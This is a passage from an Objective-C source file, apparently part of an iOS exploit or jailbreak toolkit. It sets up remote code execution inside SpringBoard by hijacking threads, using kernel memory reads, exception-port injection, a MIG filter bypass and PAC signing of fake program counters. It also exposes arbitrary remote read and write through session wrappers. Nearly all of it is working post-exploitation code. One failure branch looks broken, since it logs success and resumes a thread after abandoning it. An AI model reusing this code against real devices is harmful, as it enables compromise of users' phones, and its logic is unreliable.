                RC_DIAG("post-pthread bounce miss — raw remapped read=0x%llx",
                        (unsigned long long)pthreadAddr);
            }

            NSArray<NSNumber *> *threadsAfter = collect_all_task_threads(g_RC_taskAddr);
            for (NSNumber *n in threadsAfter) {
                if (![threadsBefore containsObject:n]) {
                    newThreadAddr = n.unsignedLongLongValue;
                    break;
                }
            }
            // Recorded before the branch below can overwrite it, because "the create
            // worked and the thread list did not change" and "the out pointer came
            // back empty" are different faults and both of them used to report as the
            // same one.
            g_RC_callThreadStep = newThreadAddr ? 0 : 2;
            if (newThreadAddr && is_kaddr_valid(newThreadAddr)) {
                RC_DIAG("found synthetic thread kaddr=0x%llx (before=%lu after=%lu)",
                        (unsigned long long)newThreadAddr,
                        (unsigned long)threadsBefore.count,
                        (unsigned long)threadsAfter.count);
            }
        } else {
            g_RC_callThreadStep = 1;
            RC_DIAG("pthread_create_suspended_np failed result=%llu success=%d — thread[1]",
                    (unsigned long long)createResult, (int)g_RC_success);
        }

        if (newThreadAddr && is_kaddr_valid(newThreadAddr)) {
            callThreadPort = task_find_port_for_thread(g_RC_taskAddr, newThreadAddr);
            RC_DIAG("synthetic thread 0x%llx port in SB space = 0x%llx",
                    (unsigned long long)newThreadAddr, (unsigned long long)callThreadPort);
            if (callThreadPort) {
                g_RC_callThreadAddr = newThreadAddr;
                createdSuspended = true;
            } else {
                // Expected on some paths, per the note at the fallback below: SpringBoard
                // holds no mach port name for a thread it never made a port for.
                // Recorded so the console can say exactly that, instead of leaving the
                // reader to infer it from a failure that has nothing to do with it.
                g_RC_callThreadStep = 4;
            }
        } else if (pthreadAddr && pthreadAddr != kCanary) {
            callThreadPort = do_remote_call_temp(100, "pthread_mach_thread_np", pthreadAddr, 0, 0, 0, 0, 0, 0, 0);
            RC_DEBUG("[%s:%d] callThreadPort: 0x%llx\n", __FUNCTION__, __LINE__, callThreadPort);
            if (g_RC_success && callThreadPort) {
                g_RC_callThreadAddr = task_get_ipc_port_kobject(g_RC_taskAddr, (mach_port_t)callThreadPort);
                if (is_kaddr_valid(g_RC_callThreadAddr)) {
                    createdSuspended = true;
                } else {
                    g_RC_callThreadStep = 7;
                    RC_DIAG("synthetic kobject invalid — thread[1]");
                    callThreadPort = 0;
                }
            } else {
                g_RC_callThreadStep = 6;
                callThreadPort = 0;
            }
        } else {
            g_RC_callThreadStep = newThreadAddr ? 3 : 5;
            RC_DIAG("create miss (bounce=0x%llx newThread=0x%llx) — falling through to thread[1] reuse",
                    (unsigned long long)pthreadAddr, (unsigned long long)newThreadAddr);
        }
    } else {
        RC_DIAG("iOS26+ pthread stubs — skipping create; trying thread[1] reuse");
    }

    // Prefer a real suspended create when we have a SB-side pthread port.
    // Otherwise reuse inject thread[1]: SB usually has NO mach port name for
    // that kernel thread in its own ipc_space, so task_find_port_for_thread
    // returns 0 (log: reuse failed). Falling back to originalThreadOnly parks
    // MAIN at FAKE_LR → IPS SIGBUS PC=LR=0x201. Park via EXC_GUARD inject +
    // reply_with_state instead (same mechanism as creator trap; no port needed).
    bool parkedViaGuard = false;
    if (!callThreadPort) {
        if (g_RC_threadList.count < 2) {
            g_RC_callThreadStep = 8;
            g_RC_callThreadPath = g_RC_createDead ? "create-failed-no-reuse" : "no-port";
            RC_DIAG("no inject thread[1] — cannot build extra call thread");
            fail_after_creator_park(RemoteCallInitFailureCallThread, targetPid);
            return -1;
        }
        uint64_t thread2Addr = g_RC_threadList[1].unsignedLongLongValue;
        if (!is_kaddr_valid(thread2Addr) || thread2Addr == g_RC_trojanThreadAddr) {
            g_RC_callThreadStep = 9;
            RC_DIAG("thread[1] invalid/same-as-signer addr=0x%llx trojan=0x%llx (list=%lu)",
                    (unsigned long long)thread2Addr,
                    (unsigned long long)g_RC_trojanThreadAddr,
                    (unsigned long)g_RC_threadList.count);
            fail_after_creator_park(RemoteCallInitFailureCallThread, targetPid);
            return -1;
        }
        g_RC_callThreadAddr = thread2Addr;
        callThreadPort = task_find_port_for_thread(g_RC_taskAddr, thread2Addr);
        RC_DIAG("thread[1] reuse addr=0x%llx port=0x%llx (0=use TRO-swap park)",
                (unsigned long long)thread2Addr, (unsigned long long)callThreadPort);

        if (callThreadPort) {
            uint64_t suspendRet = do_remote_call_temp(100, "thread_suspend", callThreadPort, 0, 0, 0, 0, 0, 0, 0);
            RC_DIAG("thread_suspend reused port=0x%llx ret=%llu",
                    (unsigned long long)callThreadPort, (unsigned long long)suspendRet);
            if (!g_RC_success || suspendRet != 0) {
                RC_DIAG("thread_suspend failed — falling back to TRO-swap park");
                callThreadPort = 0;
            }
        }
    }

    if(useMigFilterBypass)
        mig_bypass_resume();

    if (!set_exception_port_on_thread(secondExceptionPort, g_RC_callThreadAddr, useMigFilterBypass)) {
        printf("[%s:%d] Failed set exc port on new thread, retrying...\n", __FUNCTION__, __LINE__);
        pthread_create_suspended_np(&dummyThread, NULL, (void *(*)(void *))dummyFunc, NULL);
        g_RC_dummyThreadMach = pthread_mach_thread_np(dummyThread);
        g_RC_dummyThreadAddr = task_get_ipc_port_kobject(selfTask, g_RC_dummyThreadMach);
        g_RC_dummyThreadTro  = kread64(g_RC_dummyThreadAddr + off_thread_t_tro);
        sleep(1);
        if (!set_exception_port_on_thread(secondExceptionPort, g_RC_callThreadAddr, useMigFilterBypass)) {
            if(useMigFilterBypass)
                mig_bypass_pause();
            // Original still parked at FAKE_PC — restore before tear-down.
            RC_DIAG("set exc port on synthetic thread failed after retry");
            fail_after_creator_park(RemoteCallInitFailureCallThread, targetPid);
            return -1;
        }
    }

    if(useMigFilterBypass)
        mig_bypass_pause();

    if (callThreadPort && createdSuspended) {
        // The park, written from the outside, reading the thread's own state first.
        //
        // It used to be "releasing the thread IS the park", with the fake address
        // left in the creation-time program counter. That is a fake code address
        // being asked to work as a program counter, which is the same mistake this
        // file has made in four places, and it is the one that faulted.
        //
        // The earlier attempt at an explicit park was rejected for a reason that was
        // real but was misread as a reason to have no park at all. It built the state
        // from g_RC_originalState, which is the HACKED thread's stack pointer, and set
        // it on the new one, so the resumed thread ran the start routine with the
        // wrong stack. SB IPS 2026-09-26 06:21:04 recorded exactly that: a thread_set
        // _state returning kr=0 while the resumed thread ran getpid with sp=0. The
        // set_state was not the problem. The stack pointer was.
        //
        // So the state is read from the thread that is going to be parked, and only
        // the two program counters are changed. A freshly created thread already has
        // a real stack pointer, a real frame pointer and real flags, and keeping all
        // three is the whole of the difference between parking it and breaking it.
        //
        // The port is already installed by the set_exception_port_on_thread above, so
        // the fault that follows the resume has somewhere to go.
        bool parked = false;
        arm_thread_state64_internal own = {0};
        if (thread_get_state_wrapper(callThreadPort, &own)) {
            if (sign_state(g_RC_callThreadAddr, &own, FAKE_PC_TROJAN, FAKE_LR_TROJAN)) {
                parked = thread_set_state_wrapper(callThreadPort, g_RC_callThreadAddr, &own);
            }
        }
        if (!parked) {
            g_RC_callThreadStep = 14;
            g_RC_createDead = true;
            callThreadPort = 0;
            createdSuspended = false;
            RC_DIAG("could not park the fresh call thread (get_state/set_state) — "
                    "abandoning the create, thread[1] reuse next");
            g_RC_callThreadPath = "create";
            RC_DIAG("parked fresh call thread at PC=0x%llx LR=0x%llx on its own state",
                    (unsigned long long)native_strip(own.__pc),
                    (unsigned long long)native_strip(own.__lr));
            uint64_t ret = do_remote_call_temp(100, "thread_resume",
                                               callThreadPort, 0, 0, 0, 0, 0, 0, 0);
            if (ret != 0) {
                // Fatal, and deliberately so. Everything the create could fail at is
                // survivable because the reuse path is still ahead, but a thread that
                // has been given an exception port and cannot be released is neither
                // usable nor safe to abandon, and there is no third path to try.
                RC_DIAG("thread_resume synthetic failed ret=%llu (no originalThreadOnly fallback)",
                        (unsigned long long)ret);
                fail_after_creator_park(RemoteCallInitFailureThreadResume, targetPid);
                return -1;
            }
        }
    } else {
        // Either no SB port at all, or the port came from reusing thread[1] (iOS
        // 26 path, where no fresh pthread was created). Neither has a
        // creation-time PC of 0x301, so both need an explicit park via TRO-swap
        // thread_set_state (same mechanism as set_exception_port_on_thread).
        // Never originalThreadOnly.
        if (callThreadPort) {
            // The reuse path above already took a suspend on this thread via its
            // SB port. park_remote_thread_via_tro_swap does its own balanced
            // suspend/set_state/resume, so drop that extra suspend first --
            // otherwise the thread stays suspended forever.
            do_remote_call_temp(100, "thread_resume", callThreadPort, 0, 0, 0, 0, 0, 0, 0);
        }
        // The state is the reused thread's own, and the two program counters are
        // signed for the reused thread. Both were wrong, and both are the same defect
        // the fresh-thread park had two commits ago, missed here because this path
        // goes through a different helper and so was not touched when that one was
        // fixed:
        //
        //   the stack and frame pointers came from g_RC_originalState, which belongs
        //     to the hijacked thread. The reused thread was parked on someone else's
        //     stack, which is what the 2026-09-26 IPS recorded as a set_state
        //     returning kr=0 while the thread ran getpid with sp=0.
        //   the program counters were signed with g_RC_trojanThreadAddr's PAC keys.
        //     Signatures are per thread on arm64e, so a program counter signed for
        //     one thread does not authenticate when another one resumes it, and the
        //     thread faults at the moment it is released — a fault the reuse path
        //     was in no position to distinguish from anything else.
        //
        // A live SpringBoard thread has a real stack pointer, a real frame pointer and
        // real flags, and reading them is the only way to keep all three.
        arm_thread_state64_internal park = {0};
        bool haveOwn = false;
        if (callThreadPort && thread_get_state_wrapper(callThreadPort, &park)) {
            haveOwn = true;
        } else {
            park = (arm_thread_state64_internal){0};
            park.__sp = g_RC_originalState.__sp;
            park.__fp = g_RC_originalState.__fp;
            park.__flags = g_RC_originalState.__flags;
            RC_DIAG("TRO-swap park: no own state (port=0x%llx), falling back to the "
                    "hijacked thread's stack", (unsigned long long)callThreadPort);
        }
        // This signs for the REUSED thread, and the reply path in
        // do_remote_call_stable_addr_internal deliberately does the opposite, with a
        // note that it was measured:
        //
        //   "Cyanide/Fl0rk: ALWAYS sign with trojanThreadAddr (PAC gadget context),
        //    even though the exception arrives on the synthetic call thread.
        //    Signing with callThreadAddr produced uncatchable RET->0x401 SIGBUS."
        //
        // That is a real experiment against this choice and it is not being dismissed.
        // The two are different mechanisms and that is the only reason both can stand:
        // a reply delivers a state to a thread that is already stopped, and a
        // thread_set_state installs one, and the key that authenticates a program
        // counter when the thread runs it is the thread's own either way. If this
        // park faults the reused thread at the moment it is released, with
        // EXC_BAD_ACCESS.execute or EXC_BAD_INSTRUCTION and a program counter at
        // 0x301, then the note above is about this path too and the sign has to go
        // back to g_RC_trojanThreadAddr. That is a one-line change and it is recorded
        // here rather than left for the next reader to discover from a crash.
        if (!sign_state(g_RC_callThreadAddr, &park, FAKE_PC_TROJAN, FAKE_LR_TROJAN)) {
            // thread_set_state is what actually parks the target thread on this path,
            // so a failed sign here means the park never happens and the thread is
            // left running the target's own code. Stop rather than set_state it with
            // an unsigned PC.
            RC_DIAG("TRO-swap park: sign_state failed, not parking thread[1]");
            g_RC_callThreadStep = 15;
            g_RC_callThreadPath = haveOwn ? "reuse1-sign-failed-own" : "reuse1-sign-failed";
            g_RC_success = false;
            return -1;
        }
        RC_DIAG("TRO-swap park thread[1]=0x%llx pc=0x%llx lr=0x%llx sp=0x%llx own=%d",
                (unsigned long long)g_RC_callThreadAddr,
                (unsigned long long)park.__pc,
                (unsigned long long)park.__lr,
                (unsigned long long)park.__sp,
                (int)haveOwn);
        RC_DIAG("TRO-swap park begin (no join; fail restores main)");
        g_RC_callThreadPath = haveOwn ? "reuse1" : "reuse1-hijacked-sp";
        if (!park_remote_thread_via_tro_swap(g_RC_callThreadAddr, &park,
                                             useMigFilterBypass)) {
            RC_DIAG("TRO-swap park failed — restoring main @0x201");
            g_RC_callThreadStep = 16;
            fail_after_creator_park(RemoteCallInitFailureCallThread, targetPid);
            return -1;
        }
        parkedViaGuard = true; // reused flag: parked without SB port
        RC_DIAG("parked thread[1] at 0x301 via TRO-swap set_state (no port)");
    }
    (void)parkedViaGuard;

    RC_DIAG("Calling restore_trojan_thread...");
    if (!restore_trojan_thread(&g_RC_originalState)) {
        RC_DIAG("restore original after pthread bootstrap failed");
        // Extra thread is live; still tear down cleanly via destroy path later.
        // Original may be stuck — best-effort already tried.
        fail_after_creator_park(RemoteCallInitFailureRestoreOriginal, targetPid);
        return -1;
    }
    RC_DIAG("Original thread restored, calling first stable getpid...");

    g_RC_pid = (int)do_remote_call_stable(100, "getpid", 0, 0, 0, 0, 0, 0, 0, 0);
    RC_DIAG("first stable getpid result pid=%d", g_RC_pid);

    // The stable call is the first proof that the synthetic thread is really
    // parked at 0x301 and answers on secondExceptionPort. If it did not, the
    // session is unusable — bail instead of falling through to the unconditional
    // `g_RC_success = true` at the end, which used to hand callers a live-looking
    // but broken session (every later objc_msgSend then went nowhere).
    //
    // g_RC_success is the whole of that test, and the pid is not part of it. The
    // proof is that the call completed, and g_RC_success is what the transport sets
    // when it does not: a wait that gave up, a state it refused to reply onto, a
    // signature it could not produce. Adding "and the pid is non-zero" asked a
    // second question of a call whose return value cannot answer it, and it is the
    // same mistake as the bootstrap's, one call later and for the same reason.
    //
    // A zero pid is harmless here, which is worth saying out loud because it looks
    // load-bearing. Nothing addresses the target through it. g_RC_taskAddr, from
    // task_for_pid at the top of init, is what every call in the engine goes
    // through. g_RC_pid is read in exactly three places outside this file, and all
    // three are diagnostics: remote_call_current_pid tags the PUSH-REARM log line,
    // and r_sel and r_class use it as the key for the selector and class caches.
    // A cache key of zero is a perfectly good cache key, and it is scoped to the
    // session either way, because the caches are dropped in teardown.
    if (!g_RC_success) {
        RC_DIAG("first stable getpid failed (success=%d pid=%d) — tearing down session",
                (int)g_RC_success, (int)g_RC_pid);
        fail_after_creator_park(RemoteCallInitFailureFirstStableCall, targetPid);
        return -1;
    }

    g_RC_trojanMem = do_remote_call_stable(1000, "mmap", 0, PAGE_SIZE, VM_PROT_READ | VM_PROT_WRITE, MAP_PRIVATE | MAP_ANON, (uint64_t)-1, 0, 0, 0);
    RC_DIAG("stable mmap result=0x%llx", (unsigned long long)g_RC_trojanMem);

    do_remote_call_stable(100, "memset", g_RC_trojanMem, 0, PAGE_SIZE, 0, 0, 0, 0, 0);
    RC_DIAG("stable memset done");

    // The borrowed threads are deliberately left bound to this port.
    //
    // It was tried the other way: 93c125e9 set MACH_PORT_NULL on every thread init
    // had touched, to stop a natural fault from being swallowed by a queue with no
    // reader. That was never validated, and it touches exactly the thing that now
    // kills SpringBoard.
    //
    // The crash is EXC_BAD_ACCESS / SIGBUS at 0x401, which is FAKE_LR_TROJAN, on a
    // thread this project created with thread_start. That address is the return
    // trap the whole design depends on: the synthetic call thread runs the
    // selector, returns to 0x401, and the exception is caught on
    // secondExceptionPort. Reaching it as a fatal SIGBUS means the thread had no
    // exception port covering it at that moment, which is a thread losing its
    // binding rather than a thread faulting somewhere unexpected.
    //
    // Unverified code that rebinds exception ports on live threads is not worth
    // the risk of keeping while that is unexplained. back to 7ac7c454 behaviour.

    g_RC_success = true;
    RC_DEBUG("[%s:%d] Finished successfully\n", __FUNCTION__, __LINE__);

    return 0;
}

int init_remote_call_with_first_exception_timeout(const char* process, bool useMigFilterBypass, int firstExceptionTimeoutMS)
{
    RemoteCallState *state = remote_call_current_state();
    int previousTimeout = state->firstExceptionTimeoutMS;
    state->firstExceptionTimeoutMS = firstExceptionTimeoutMS > 0 ? firstExceptionTimeoutMS : previousTimeout;
    int result = init_remote_call(process, useMigFilterBypass);
    state->firstExceptionTimeoutMS = previousTimeout;
    return result;
}

int init_remote_call_original_thread_only_with_first_exception_timeout(const char* process, bool useMigFilterBypass, int firstExceptionTimeoutMS)
{
    RemoteCallState *state = remote_call_current_state();
    bool previousOriginalThreadOnly = state->originalThreadOnly;
    state->originalThreadOnly = true;
    int result = init_remote_call_with_first_exception_timeout(process, useMigFilterBypass, firstExceptionTimeoutMS);
    state->originalThreadOnly = previousOriginalThreadOnly;
    return result;
}

@implementation RemoteCallSession {
    RemoteCallState _state;
}

- (instancetype)initWithProcess:(NSString *)process useMigFilterBypass:(BOOL)useMigFilterBypass
{
    return [self initWithProcess:process
              useMigFilterBypass:useMigFilterBypass
         firstExceptionTimeoutMS:120000];
}

- (instancetype)initWithProcess:(NSString *)process
              useMigFilterBypass:(BOOL)useMigFilterBypass
         firstExceptionTimeoutMS:(int)firstExceptionTimeoutMS
{
    return [self initWithProcess:process
              useMigFilterBypass:useMigFilterBypass
         firstExceptionTimeoutMS:firstExceptionTimeoutMS
              originalThreadOnly:NO];
}

- (instancetype)initWithProcess:(NSString *)process
              useMigFilterBypass:(BOOL)useMigFilterBypass
         firstExceptionTimeoutMS:(int)firstExceptionTimeoutMS
              originalThreadOnly:(BOOL)originalThreadOnly
{
    self = [super init];
    if (!self)
        return nil;

    memset((void *)&_state, 0, sizeof(_state));
    _state.success = true;
    _state.threadList = [NSMutableArray new];
    _state.firstExceptionTimeoutMS = firstExceptionTimeoutMS > 0 ? firstExceptionTimeoutMS : 120000;
    _state.stableExceptionTimeoutFloorMS = 10000;
    _state.originalThreadOnly = originalThreadOnly;

    const char *processName = process.UTF8String;
    if (!processName)
        return nil;

    RemoteCallState *previous = remote_call_push_state(&_state);
    int result = init_remote_call(processName, useMigFilterBypass);
    if (result != 0) {
        abandon_remote_call();
    }
    remote_call_pop_state(previous);

    if (result != 0)
        return nil;

    return self;
}

- (void)dealloc
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    if (remote_call_has_local_state()) {
        destroy_remote_call();
    }
    remote_call_pop_state(previous);
}

- (uint64_t)taskAddr
{
    return _state.taskAddr;
}

- (uint64_t)trojanMem
{
    return _state.trojanMem;
}

- (int)pid
{
    return _state.pid;
}

- (uint64_t)doRemoteCallStableWithTimeout:(int)timeout
                             functionName:(const char *)name
                                       x0:(uint64_t)x0
                                       x1:(uint64_t)x1
                                       x2:(uint64_t)x2
                                       x3:(uint64_t)x3
                                       x4:(uint64_t)x4
                                       x5:(uint64_t)x5
                                       x6:(uint64_t)x6
                                       x7:(uint64_t)x7
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    uint64_t result = do_remote_call_stable(timeout, name, x0, x1, x2, x3, x4, x5, x6, x7);
    remote_call_pop_state(previous);
    return result;
}

- (uint64_t)doRemoteCallStableWithTimeout:(int)timeout
                          functionAddress:(uint64_t)pcAddr
                             functionName:(const char *)name
                                       x0:(uint64_t)x0
                                       x1:(uint64_t)x1
                                       x2:(uint64_t)x2
                                       x3:(uint64_t)x3
                                       x4:(uint64_t)x4
                                       x5:(uint64_t)x5
                                       x6:(uint64_t)x6
                                       x7:(uint64_t)x7
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    uint64_t result = do_remote_call_stable_addr(timeout, pcAddr, name, x0, x1, x2, x3, x4, x5, x6, x7);
    remote_call_pop_state(previous);
    return result;
}

- (BOOL)remoteRead:(uint64_t)src to:(void *)dst size:(uint64_t)size
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    BOOL result = remote_read(src, dst, size);
    remote_call_pop_state(previous);
    return result;
}

- (uint64_t)remoteRead64:(uint64_t)src
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    uint64_t result = remote_read64(src);
    remote_call_pop_state(previous);
    return result;
}

- (BOOL)remoteWrite:(uint64_t)dst from:(const void *)src size:(uint64_t)size
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    BOOL result = remote_write(dst, src, size);
    remote_call_pop_state(previous);
    return result;
}

- (BOOL)remoteWrite64:(uint64_t)dst value:(uint64_t)val
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    BOOL result = remote_write64(dst, val);
    remote_call_pop_state(previous);
    return result;
}

- (BOOL)remoteWriteString:(uint64_t)dst value:(const char *)str
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    BOOL result = remote_writeStr(dst, str);
    remote_call_pop_state(previous);
    return result;
}

- (int)destroyRemoteCall
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    int result = destroy_remote_call();
    remote_call_pop_state(previous);
    return result;
}

- (void)abandonRemoteCall
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    abandon_remote_call();
    remote_call_pop_state(previous);
}

- (BOOL)hasLocalState
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    BOOL result = remote_call_has_local_state();
    remote_call_pop_state(previous);
    return result;
}

- (RemoteCallState *)remoteCallStatePointer
{
    return &_state;
}

- (RemotePointer *)objectAtIndexedSubscript:(NSUInteger)address
{
    return [[RemotePointer alloc] initWithSession:self address:address];
}

@end

#define REMOTE_POINTER_DEFAULT_STRING_MAX 0x4000
#define REMOTE_POINTER_STRING_CHUNK 0x100

@implementation RemotePointer

- (instancetype)initWithSession:(RemoteCallSession *)session address:(uint64_t)address
{
    self = [super init];
    if (!self)
        return nil;

    _session = session;
    _address = address;
    return self;
}

- (BOOL)readTo:(void *)dst size:(uint64_t)size
{
    return [_session remoteRead:_address to:dst size:size];
}

- (BOOL)writeFrom:(const void *)src size:(uint64_t)size
{
    return [_session remoteWrite:_address from:src size:size];
}

- (BOOL)writeCString:(const char *)string
{
    return [_session remoteWriteString:_address value:string];
}

- (void)setString:(NSString *)string
{
    [self writeCString:string.UTF8String];
}

- (NSString *)string
{
    return [self stringWithMaxLength:REMOTE_POINTER_DEFAULT_STRING_MAX];
}

- (NSString *)stringWithMaxLength:(size_t)maxLength
{
    if (!_session || !_address || maxLength == 0)
        return nil;

    char *buf = (char *)calloc(maxLength + 1, 1);
    if (!buf)
        return nil;

    size_t copied = 0;
    while (copied < maxLength) {
        size_t chunk = REMOTE_POINTER_STRING_CHUNK;
        if (chunk > maxLength - copied)
            chunk = maxLength - copied;

        uint64_t current = _address + copied;
        size_t pageRemaining = (size_t)(PAGE_SIZE - (current & PAGE_MASK));
        if (chunk > pageRemaining)
            chunk = pageRemaining;

        if (![_session remoteRead:_address + copied to:buf + copied size:chunk]) {
            free(buf);
            return nil;
        }

        char *end = memchr(buf + copied, 0, chunk);
        if (end) {
            size_t length = (size_t)(end - buf);
            NSString *result = [[NSString alloc] initWithBytes:buf length:length encoding:NSUTF8StringEncoding];
            free(buf);
            return result;
        }

        copied += chunk;
    }

    NSString *result = [[NSString alloc] initWithBytes:buf length:maxLength encoding:NSUTF8StringEncoding];
    free(buf);
    return result;
}

- (void)setValue8:(uint8_t)value
{
    [self writeFrom:&value size:sizeof(value)];
}

- (uint8_t)value8
{
    uint8_t value = 0;
    [self readTo:&value size:sizeof(value)];
    return value;
}

- (void)setValue16:(uint16_t)value
{
    [self writeFrom:&value size:sizeof(value)];
}

- (uint16_t)value16
{
    uint16_t value = 0;
    [self readTo:&value size:sizeof(value)];
    return value;
}

- (void)setValue32:(uint32_t)value
{
    [self writeFrom:&value size:sizeof(value)];
}

- (uint32_t)value32
{
    uint32_t value = 0;
    [self readTo:&value size:sizeof(value)];
    return value;
}

- (void)setValue64:(uint64_t)value
{
    [self writeFrom:&value size:sizeof(value)];
}

- (uint64_t)value64
{
    uint64_t value = 0;
    [self readTo:&value size:sizeof(value)];
    return value;
}

@end

void remote_call_with_session(RemoteCallSession *session, void (^block)(void))
{
    if (!block)
        return;

    if (!session) {
        block();
        return;
    }

    RemoteCallState *state = [session remoteCallStatePointer];
    RemoteCallState *previous = remote_call_push_state(state);
    @try {
        block();
    } @finally {
        remote_call_pop_state(previous);
    }
}
